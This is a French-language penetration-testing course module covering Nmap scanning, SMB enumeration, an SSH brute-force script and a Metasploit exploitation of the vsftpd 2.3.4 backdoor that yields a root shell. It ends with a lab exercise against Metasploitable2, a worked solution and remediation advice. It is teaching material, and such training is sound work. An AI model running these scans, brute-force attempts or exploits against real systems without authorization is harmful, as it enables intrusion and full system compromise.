---
tags:
  - hacking
  - nmap
  - recon
  - scanning
  - formation
---

# Module 2 : Reconnaissance & Réseau

"Si je disposais de huit heures pour abattre un arbre, j'en consacrerais six à affûter ma hache." (Lincoln). En hacking, c'est pareil : 80% de reconnaissance, 20% d'attaque.

## 1. Reconnaissance Active : Nmap

**Nmap** est le roi du scan réseau. Il répond à 3 questions :
1.  Quelles machines sont actives ? (Host Discovery)
2.  Quels ports sont ouverts ? (Port Scanning)
3.  Quels services tournent dessus ? (Service Enumeration)

### Scans Essentiels

```bash
# Scan rapide (Top 1000 ports)
nmap 192.168.1.10

# Scan complet (Tous les ports 0-65535)
nmap -p- 192.168.1.10

# Scan de services et versions (-sV) + OS (-O)
nmap -sV -O 192.168.1.10

# Le scan "Agressif" (Scripts par défaut, versions, OS)
nmap -A 192.168.1.10
```

### NSE (Nmap Scripting Engine)
Nmap peut aussi détecter des vulnérabilités.

```bash
# Chercher des vulnérabilités connues
nmap --script vuln 192.168.1.10

# Bruteforce SSH (Attention, bruyant !)
nmap -p 22 --script ssh-brute 192.168.1.10
```

## 2. Énumération de Services

Une fois un port ouvert trouvé, il faut lui parler.

### Netcat (Le couteau suisse)
```bash
# Connexion simple (Banner grabbing)
nc -nv 192.168.1.10 80
```

### SMB (Samba / Windows Share)
Souvent une mine d'or.
```bash
# Lister les partages
smbclient -L //192.168.1.10 -N

# Enumérer les utilisateurs (Linux)
enum4linux -a 192.168.1.10
```

## 3. Exploitation avec Metasploit

**Metasploit Framework (MSF)** est une immense base de données d'exploits.

### Workflow MSF
1.  **Search** : Trouver l'exploit.
2.  **Use** : Sélectionner l'exploit.
3.  **Set** : Configurer la cible (RHOSTS) et le Payload (Reverse Shell).
4.  **Exploit** : Feu !

### Exemple : Attaque vsftpd 2.3.4 (Backdoor connue)

```bash
msfconsole

# Dans la console msf :
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.1.10
msf6 > set RPORT 21
msf6 > check
# [+] The target is vulnerable.

msf6 > exploit
# Shell session 1 opened...
# whoami
# root
```

> **Attention** : Metasploit est "bruyant" (détecté par tous les antivirus). Les pros codent souvent leurs propres scripts ou utilisent des outils plus discrets.

---

## Exercice Pratique

!!! example "Exercice : Reconnaissance et Exploitation"

    **Objectif** : Scanner une machine cible et identifier une vulnérabilité exploitable.

    **Prérequis** :
    - Une machine Kali Linux
    - Une machine cible vulnérable (Metasploitable2 recommandée)
    - Nmap et Metasploit installés

    **Instructions** :

    1. **Scan Initial** : Effectuez un scan rapide pour identifier les ports ouverts
       ```bash
       nmap -T4 -F <IP_CIBLE>
       ```

    2. **Scan Approfondi** : Identifiez les services et versions sur les ports ouverts
       ```bash
       nmap -sV -sC -p <PORTS> <IP_CIBLE>
       ```

    3. **Recherche de Vulnérabilités** : Utilisez les scripts NSE pour détecter des failles
       ```bash
       nmap --script vuln -p <PORTS> <IP_CIBLE>
       ```

    4. **Exploitation** : Trouvez et exploitez une vulnérabilité avec Metasploit
       - Lancez `msfconsole`
       - Recherchez un exploit correspondant au service vulnérable
       - Configurez et lancez l'exploitation

    **Questions** :
    - Quels sont les 3 ports les plus critiques identifiés ?
    - Quel service présente une vulnérabilité connue ?
    - Quel niveau de privilège avez-vous obtenu après exploitation ?

??? quote "Solution"

    **Scan Initial** :
    ```bash
    nmap -T4 -F 192.168.1.100
    # Résultats typiques : 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP), 139/tcp (SMB)
    ```

    **Scan Approfondi** :
    ```bash
    nmap -sV -sC -p 21,22,80,139,445 192.168.1.100
    # Identification : vsftpd 2.3.4 sur port 21 (VULNÉRABLE)
    ```

    **Exploitation avec Metasploit** :
    ```bash
    msfconsole
    msf6 > search vsftpd
    msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
    msf6 > set RHOSTS 192.168.1.100
    msf6 > set RPORT 21
    msf6 > check
    # [+] The target appears to be vulnerable.
    msf6 > exploit
    # [*] Command shell session 1 opened
    ```

    **Vérification** :
    ```bash
    whoami
    # root (Accès root direct via la backdoor)
    ```

    **Points Critiques Identifiés** :
    1. **Port 21 (FTP)** : vsftpd 2.3.4 avec backdoor - CRITIQUE
    2. **Port 139/445 (SMB)** : Partages accessibles sans authentification - ÉLEVÉ
    3. **Port 80 (HTTP)** : Application web potentiellement vulnérable - MOYEN

    **Recommandations** :
    - Mettre à jour vsftpd vers une version récente
    - Désactiver FTP si non nécessaire
    - Configurer l'authentification SMB
    - Segmenter le réseau avec des règles firewall strictes

---

## Navigation

| | |
|:---|---:|
| [← Module 1 : Mindset, Légalité & Lab](01-module.md) | [Module 3 : Web Hacking →](03-module.md) |

[Retour au Programme](index.md){ .md-button }
